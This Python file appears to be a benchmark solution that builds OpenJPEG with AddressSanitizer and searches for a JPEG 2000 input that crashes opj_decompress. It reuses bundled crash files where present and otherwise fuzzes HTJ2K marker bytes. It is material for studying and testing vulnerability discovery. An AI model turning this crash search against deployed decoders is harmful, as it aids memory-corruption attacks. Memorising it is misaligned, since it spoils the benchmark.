import os
import re
import tarfile
import tempfile
import subprocess
import time
import random
import struct
from typing import List, Optional, Tuple, Dict


def _is_jp2_signature(b: bytes) -> bool:
    return len(b) >= 12 and b[:12] == b"\x00\x00\x00\x0cjP  \r\n\x87\n"


def _is_j2k_soc(b: bytes) -> bool:
    return len(b) >= 2 and b[0] == 0xFF and b[1] == 0x4F


def _safe_extract_tar(tar_path: str, dst_dir: str) -> None:
    with tarfile.open(tar_path, "r:*") as tf:
        for m in tf.getmembers():
            if not m.name or m.name.startswith("/") or ".." in m.name.split("/"):
                continue
            tf.extract(m, dst_dir)


def _collect_tar_embedded_candidates(tar_path: str, max_size: int = 2_000_000) -> List[Tuple[str, bytes]]:
    cands: List[Tuple[str, bytes]] = []
    try:
        with tarfile.open(tar_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                if m.size <= 0 or m.size > max_size:
                    continue
                name = m.name.lower()
                if not (name.endswith((".j2k", ".j2c", ".jp2", ".jph")) or any(k in name for k in ("crash", "poc", "ossfuzz", "fuzz", "corpus", "repro"))):
                    continue
                f = tf.extractfile(m)
                if not f:
                    continue
                data = f.read()
                if _is_j2k_soc(data) or _is_jp2_signature(data):
                    cands.append((m.name, data))
    except Exception:
        return []
    return cands


def _find_openjpeg_root(extracted_dir: str) -> str:
    best = None
    best_score = -1
    for root, dirs, files in os.walk(extracted_dir):
        if "CMakeLists.txt" not in files:
            continue
        cmake_path = os.path.join(root, "CMakeLists.txt")
        try:
            with open(cmake_path, "rb") as f:
                txt = f.read(200_000)
        except Exception:
            continue
        score = 0
        low = txt.lower()
        if b"openjpeg" in low or b"openjp2" in low:
            score += 3
        if b"project(" in low:
            score += 1
        if os.path.isdir(os.path.join(root, "src")):
            score += 1
        if os.path.isdir(os.path.join(root, "src", "lib", "openjp2")):
            score += 4
        if os.path.isdir(os.path.join(root, "libopenjp2")):
            score += 2
        if score > best_score:
            best_score = score
            best = root
    return best if best else extracted_dir


def _run(cmd: List[str], cwd: Optional[str] = None, env: Optional[Dict[str, str]] = None, timeout: int = 600) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, cwd=cwd, env=env, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=timeout)


def _build_openjpeg(root: str, build_dir: str) -> Dict[str, str]:
    os.makedirs(build_dir, exist_ok=True)
    cflags = "-O1 -g -fno-omit-frame-pointer -fsanitize=address"
    cxxflags = cflags
    ldflags = "-fsanitize=address"
    cmake_cmd = [
        "cmake", "-S", root, "-B", build_dir,
        "-DCMAKE_BUILD_TYPE=RelWithDebInfo",
        "-DBUILD_SHARED_LIBS=OFF",
        "-DBUILD_CODEC=ON",
        "-DBUILD_TESTING=OFF",
        "-DBUILD_DOC=OFF",
        "-DBUILD_JPIP=OFF",
        "-DBUILD_MJ2=OFF",
        "-DWITH_PNG=OFF",
        "-DWITH_TIFF=OFF",
        "-DWITH_JPEG=OFF",
        "-DWITH_LCMS2=OFF",
        f"-DCMAKE_C_FLAGS={cflags}",
        f"-DCMAKE_CXX_FLAGS={cxxflags}",
        f"-DCMAKE_EXE_LINKER_FLAGS={ldflags}",
    ]
    try:
        p = _run(cmake_cmd, timeout=600)
        if p.returncode != 0:
            raise RuntimeError(p.stderr.decode("utf-8", "ignore")[:4000])
    except Exception:
        cmake_cmd = [
            "cmake", "-S", root, "-B", build_dir,
            "-DCMAKE_BUILD_TYPE=RelWithDebInfo",
            "-DBUILD_SHARED_LIBS=OFF",
            "-DBUILD_CODEC=ON",
            "-DBUILD_TESTING=OFF",
            "-DBUILD_DOC=OFF",
            f"-DCMAKE_C_FLAGS={cflags}",
            f"-DCMAKE_CXX_FLAGS={cxxflags}",
            f"-DCMAKE_EXE_LINKER_FLAGS={ldflags}",
        ]
        p = _run(cmake_cmd, timeout=600)
        if p.returncode != 0:
            raise RuntimeError(p.stderr.decode("utf-8", "ignore")[:4000])

    targets = ["opj_decompress", "opj_compress", "opj_dump"]
    build_cmd = ["cmake", "--build", build_dir, "-j", str(min(8, os.cpu_count() or 2))]
    p = _run(build_cmd, timeout=1200)
    if p.returncode != 0:
        p2 = _run(["cmake", "--build", build_dir, "--target"] + targets + ["-j", str(min(8, os.cpu_count() or 2))], timeout=1200)
        if p2.returncode != 0:
            raise RuntimeError((p.stderr + b"\n" + p2.stderr).decode("utf-8", "ignore")[:4000])

    bins: Dict[str, str] = {}
    for r, d, f in os.walk(build_dir):
        for n in f:
            if n in ("opj_decompress", "opj_compress", "opj_dump"):
                path = os.path.join(r, n)
                if os.access(path, os.X_OK):
                    bins[n] = path
    if "opj_decompress" not in bins:
        raise RuntimeError("opj_decompress not found after build")
    return bins


def _asan_env() -> Dict[str, str]:
    env = dict(os.environ)
    env["ASAN_OPTIONS"] = "abort_on_error=1:halt_on_error=1:detect_leaks=0:symbolize=0:allocator_may_return_null=1"
    return env


def _run_decompress(decompress_bin: str, data: bytes, workdir: str, timeout: int = 6) -> Tuple[int, bytes, bytes]:
    inp = os.path.join(workdir, "in.j2k")
    outp = os.path.join(workdir, "out.bmp")
    with open(inp, "wb") as f:
        f.write(data)
    cmd = [decompress_bin, "-i", inp, "-o", outp]
    try:
        p = _run(cmd, cwd=workdir, env=_asan_env(), timeout=timeout)
        return p.returncode, p.stdout, p.stderr
    except subprocess.TimeoutExpired as e:
        return 124, b"", (e.stdout or b"") + b"\n" + (e.stderr or b"")


def _looks_like_asan_crash(rc: int, stderr: bytes) -> bool:
    if b"AddressSanitizer" in stderr or b"ERROR: AddressSanitizer" in stderr:
        return True
    if b"heap-buffer-overflow" in stderr or b"stack-buffer-overflow" in stderr:
        return True
    if rc < 0:
        return True
    return False


def _trim_to_eoc(data: bytes) -> bytes:
    idx = data.rfind(b"\xff\xd9")
    if idx != -1:
        return data[:idx + 2]
    return data


def _parse_main_header_segments_j2k(data: bytes) -> List[Tuple[int, int, int]]:
    segs: List[Tuple[int, int, int]] = []
    if not _is_j2k_soc(data):
        return segs
    i = 2
    n = len(data)
    no_len = {0x4F, 0xD9, 0x93, 0x92}  # SOC, EOC, SOD, EPH(no length)
    while i + 1 < n:
        if data[i] != 0xFF:
            i += 1
            continue
        marker = data[i + 1]
        m = (0xFF << 8) | marker
        if marker == 0x90:  # SOT
            break
        if marker in no_len:
            segs.append((m, i, 2))
            i += 2
            if marker == 0x93:
                break
            continue
        if i + 4 > n:
            break
        L = (data[i + 2] << 8) | data[i + 3]
        if L < 2:
            break
        total = 2 + L
        if i + total > n:
            break
        segs.append((m, i, total))
        i += total
    return segs


def _find_sod_offsets(data: bytes, max_hits: int = 4) -> List[int]:
    offs = []
    i = 0
    while True:
        j = data.find(b"\xff\x93", i)
        if j == -1:
            break
        offs.append(j)
        if len(offs) >= max_hits:
            break
        i = j + 2
    return offs


def _extract_ht_flags_from_help(help_text: str) -> List[Tuple[str, Optional[str]]]:
    flags: List[Tuple[str, Optional[str]]] = []
    lines = help_text.splitlines()
    for ln in lines:
        lnl = ln.lower()
        if "ht" not in lnl:
            continue
        m = re.search(r"(^|\s)(-\w)\b", ln)
        if m:
            fl = m.group(2)
            need_arg = None
            if re.search(re.escape(fl) + r"\s*<", ln) or re.search(re.escape(fl) + r"\s+\[", ln):
                need_arg = "1"
            flags.append((fl, need_arg))
        m2 = re.search(r"(^|\s)(--[a-z0-9][a-z0-9\-]+)\b", ln, flags=re.I)
        if m2:
            fl = m2.group(2)
            need_arg = None
            if re.search(re.escape(fl) + r"(=|\s+)<", ln) or re.search(re.escape(fl) + r"(=|\s+)\[", ln):
                need_arg = "1"
            flags.append((fl, need_arg))
    pref = [("-H", None), ("--ht", None), ("-HT", None), ("--htj2k", None), ("--enable-ht", None), ("--enable-htj2k", None)]
    seen = set()
    out: List[Tuple[str, Optional[str]]] = []
    for fl, arg in pref + flags:
        if fl in seen:
            continue
        seen.add(fl)
        out.append((fl, arg))
    return out


def _create_pgm(path: str, w: int, h: int) -> None:
    header = f"P5\n{w} {h}\n255\n".encode("ascii")
    data = bytearray(w * h)
    for y in range(h):
        for x in range(w):
            data[y * w + x] = (x * 7 + y * 13) & 0xFF
    with open(path, "wb") as f:
        f.write(header)
        f.write(data)


def _is_ht_codestream(opj_dump_bin: Optional[str], workdir: str, data: bytes) -> bool:
    if not opj_dump_bin:
        return b"\xff\x50" in data or b"CAP" in data  # heuristic
    inp = os.path.join(workdir, "chk.j2k")
    with open(inp, "wb") as f:
        f.write(data)
    try:
        p = _run([opj_dump_bin, "-i", inp], cwd=workdir, env=_asan_env(), timeout=8)
    except Exception:
        return b"\xff\x50" in data
    out = (p.stdout + b"\n" + p.stderr).decode("utf-8", "ignore").lower()
    if "htj2k" in out or "high throughput" in out:
        return True
    if re.search(r"\bht\b", out) and ("tier-1" in out or "t1" in out or "coder" in out):
        return True
    return b"\xff\x50" in data


def _generate_seeds(opj_compress_bin: str, opj_dump_bin: Optional[str], workdir: str) -> List[bytes]:
    pgm = os.path.join(workdir, "in.pgm")
    seeds: List[bytes] = []

    try:
        p = _run([opj_compress_bin, "-h"], cwd=workdir, env=_asan_env(), timeout=15)
        help_text = (p.stdout + b"\n" + p.stderr).decode("utf-8", "ignore")
    except Exception:
        help_text = ""

    ht_flags = _extract_ht_flags_from_help(help_text) if help_text else [("-H", None), ("--ht", None), ("-HT", None), ("--htj2k", None)]

    dims = [(16, 16), (32, 32), (64, 64), (128, 128), (256, 256)]
    extra_opts = [
        [],
        ["-n", "1"],
        ["-n", "2"],
        ["-n", "3"],
        ["-b", "64,64"],
        ["-b", "128,128"],
        ["-b", "256,256"],
        ["-r", "50"],
        ["-r", "100"],
        ["-r", "200"],
        ["-r", "500"],
        ["-n", "2", "-b", "64,64", "-r", "100"],
        ["-n", "3", "-b", "64,64", "-r", "100"],
    ]

    for w, h in dims:
        _create_pgm(pgm, w, h)
        for fl, arg in ht_flags:
            for opts in extra_opts:
                outp = os.path.join(workdir, "out.j2k")
                cmd = [opj_compress_bin]
                cmd.extend(opts)
                cmd.append(fl)
                if arg is not None:
                    cmd.append(arg)
                cmd.extend(["-i", pgm, "-o", outp])
                try:
                    p = _run(cmd, cwd=workdir, env=_asan_env(), timeout=20)
                except Exception:
                    continue
                if p.returncode != 0:
                    err = (p.stderr or b"").decode("utf-8", "ignore").lower()
                    if "requires an argument" in err or "missing argument" in err:
                        cmd2 = cmd[:] + ["1"]
                        try:
                            p2 = _run(cmd2, cwd=workdir, env=_asan_env(), timeout=20)
                        except Exception:
                            continue
                        if p2.returncode != 0:
                            continue
                    else:
                        continue
                if not os.path.exists(outp):
                    continue
                try:
                    data = open(outp, "rb").read()
                except Exception:
                    continue
                if not _is_j2k_soc(data):
                    continue
                if _is_ht_codestream(opj_dump_bin, workdir, data):
                    seeds.append(_trim_to_eoc(data))
        if seeds:
            break

    if not seeds:
        _create_pgm(pgm, 64, 64)
        outp = os.path.join(workdir, "out_plain.j2k")
        cmd = [opj_compress_bin, "-i", pgm, "-o", outp, "-r", "100"]
        try:
            p = _run(cmd, cwd=workdir, env=_asan_env(), timeout=20)
            if p.returncode == 0 and os.path.exists(outp):
                data = open(outp, "rb").read()
                if _is_j2k_soc(data):
                    seeds.append(_trim_to_eoc(data))
        except Exception:
            pass

    uniq = []
    seen = set()
    for s in seeds:
        if len(s) < 16:
            continue
        h = (len(s), s[:32], s[-32:])
        if h in seen:
            continue
        seen.add(h)
        uniq.append(s)
    uniq.sort(key=len)
    return uniq[:6]


def _mutate_and_find_crash(seed: bytes, decompress_bin: str, workdir: str, deadline: float) -> Optional[bytes]:
    seed = _trim_to_eoc(seed)
    segs = _parse_main_header_segments_j2k(seed)
    cod_positions: List[int] = []
    cod_style_positions: List[int] = []
    cod_decomp_positions: List[int] = []

    for m, start, total in segs:
        if m == 0xFF52 or m == 0xFF53:  # COD/COC
            data_start = start + 4
            data_len = total - 4
            if data_len >= 9:
                cod_decomp_positions.append(data_start + 5)
                cod_positions.append(data_start + 6)
                cod_style_positions.append(data_start + 7)

    sods = _find_sod_offsets(seed, max_hits=2)
    tile_offsets: List[int] = []
    if sods:
        sod = sods[0]
        data_start = sod + 2
        end = min(len(seed), data_start + 1024)
        tile_offsets = list(range(data_start, end))

    mutation_offsets = list(set(cod_positions + cod_style_positions + cod_decomp_positions))
    if not mutation_offsets:
        mutation_offsets = list(range(0, min(len(seed), 256)))

    def test(data: bytes) -> bool:
        rc, _, se = _run_decompress(decompress_bin, data, workdir, timeout=6)
        return _looks_like_asan_crash(rc, se)

    if time.monotonic() > deadline:
        return None

    if test(seed):
        return seed

    for v in (0xFF, 0x00, 0xF0, 0x0F, 0xEE, 0x11, 0x88, 0x7F, 0xFE, 0x55, 0xAA):
        if time.monotonic() > deadline:
            return None
        m = bytearray(seed)
        for p in cod_positions:
            if 0 <= p < len(m):
                m[p] = v
        for p in cod_style_positions:
            if 0 <= p < len(m):
                m[p] ^= 0xFF
        cand = bytes(m)
        if test(cand):
            return _trim_to_eoc(cand)

    for v in (0x00, 0xFF, 0x01, 0x7F, 0x10, 0x20):
        if time.monotonic() > deadline:
            return None
        m = bytearray(seed)
        for p in cod_decomp_positions:
            if 0 <= p < len(m):
                m[p] = v
        cand = bytes(m)
        if test(cand):
            return _trim_to_eoc(cand)

    rng = random.Random(0x47500)
    for _ in range(180):
        if time.monotonic() > deadline:
            return None
        m = bytearray(seed)
        k = rng.randint(1, 6)
        for _j in range(k):
            p = rng.choice(mutation_offsets)
            m[p] = rng.randrange(256)
        if tile_offsets and rng.random() < 0.8:
            for _j in range(rng.randint(1, 8)):
                p = rng.choice(tile_offsets)
                m[p] ^= 1 << rng.randrange(8)
        cand = bytes(m)
        if test(cand):
            return _trim_to_eoc(cand)

    return None


def _fallback_minimal_j2k() -> bytes:
    out = bytearray()
    out += b"\xff\x4f"  # SOC
    # SIZ
    Csiz = 1
    Lsiz = 38 + 3 * Csiz
    out += b"\xff\x51" + struct.pack(">H", Lsiz)
    out += struct.pack(">H", 0)  # Rsiz
    out += struct.pack(">I", 1)  # Xsiz
    out += struct.pack(">I", 1)  # Ysiz
    out += struct.pack(">I", 0)  # XOsiz
    out += struct.pack(">I", 0)  # YOsiz
    out += struct.pack(">I", 1)  # XTsiz
    out += struct.pack(">I", 1)  # YTsiz
    out += struct.pack(">I", 0)  # XTOsiz
    out += struct.pack(">I", 0)  # YTOsiz
    out += struct.pack(">H", 1)  # Csiz
    out += bytes([7, 1, 1])  # 8-bit unsigned, sub-sampling 1x1
    # COD
    out += b"\xff\x52" + struct.pack(">H", 12)
    out += bytes([0])  # Scod
    out += bytes([0])  # prog
    out += struct.pack(">H", 1)  # layers
    out += bytes([0])  # mct
    out += bytes([0])  # numdecomp
    out += bytes([0x44])  # cblk exp (64,64)
    out += bytes([0])  # cblkstyle
    out += bytes([0])  # reversible
    # QCD
    out += b"\xff\x5c" + struct.pack(">H", 4)
    out += bytes([0])  # Sqcd
    out += bytes([0])  # SPqcd for 1 subband
    # SOT
    out += b"\xff\x90" + struct.pack(">H", 10)
    out += struct.pack(">H", 0)  # Isot
    out += struct.pack(">I", 0)  # Psot unknown
    out += bytes([0, 1])  # TPsot, TNsot
    # SOD + empty
    out += b"\xff\x93"
    out += b"\xff\xd9"  # EOC
    return bytes(out)


class Solution:
    def solve(self, src_path: str) -> bytes:
        embedded = []
        if os.path.isfile(src_path):
            embedded = _collect_tar_embedded_candidates(src_path, max_size=500_000)
            embedded.sort(key=lambda x: (0 if any(k in x[0].lower() for k in ("crash", "poc", "repro")) else 1, abs(len(x[1]) - 1479), len(x[1])))
            for name, data in embedded[:3]:
                if any(k in name.lower() for k in ("crash", "poc", "repro", "ossfuzz")):
                    return _trim_to_eoc(data)

        with tempfile.TemporaryDirectory() as td:
            try:
                if os.path.isdir(src_path):
                    extracted_dir = src_path
                else:
                    extracted_dir = os.path.join(td, "src")
                    os.makedirs(extracted_dir, exist_ok=True)
                    _safe_extract_tar(src_path, extracted_dir)

                root = _find_openjpeg_root(extracted_dir)
                build_dir = os.path.join(td, "build")
                bins = _build_openjpeg(root, build_dir)
                dec = bins["opj_decompress"]
                comp = bins.get("opj_compress")
                dumpb = bins.get("opj_dump")

                workdir = os.path.join(td, "work")
                os.makedirs(workdir, exist_ok=True)

                if embedded:
                    for _name, data in embedded[:40]:
                        rc, _, se = _run_decompress(dec, data, workdir, timeout=6)
                        if _looks_like_asan_crash(rc, se):
                            return _trim_to_eoc(data)

                seeds: List[bytes] = []
                if comp:
                    seeds.extend(_generate_seeds(comp, dumpb, workdir))

                file_seeds: List[bytes] = []
                for r, d, f in os.walk(extracted_dir):
                    for n in f:
                        nl = n.lower()
                        if not nl.endswith((".j2k", ".j2c", ".jph", ".jp2")):
                            continue
                        p = os.path.join(r, n)
                        try:
                            st = os.stat(p)
                        except Exception:
                            continue
                        if st.st_size <= 0 or st.st_size > 500_000:
                            continue
                        try:
                            data = open(p, "rb").read()
                        except Exception:
                            continue
                        if _is_j2k_soc(data) or _is_jp2_signature(data):
                            file_seeds.append(_trim_to_eoc(data))
                file_seeds.sort(key=len)
                seeds.extend(file_seeds[:8])

                if not seeds:
                    return _fallback_minimal_j2k()

                uniq: List[bytes] = []
                seen = set()
                for s in seeds:
                    sig = (len(s), s[:16], s[-16:])
                    if sig in seen:
                        continue
                    seen.add(sig)
                    uniq.append(s)
                uniq.sort(key=len)
                seeds = uniq[:8]

                deadline = time.monotonic() + 70.0
                for seed in seeds:
                    rc, _, se = _run_decompress(dec, seed, workdir, timeout=6)
                    if _looks_like_asan_crash(rc, se):
                        return _trim_to_eoc(seed)

                for seed in seeds:
                    if time.monotonic() > deadline:
                        break
                    crash = _mutate_and_find_crash(seed, dec, workdir, deadline)
                    if crash:
                        return _trim_to_eoc(crash)

                return _trim_to_eoc(seeds[0])
            except Exception:
                if embedded:
                    return _trim_to_eoc(embedded[0][1])
                return _fallback_minimal_j2k()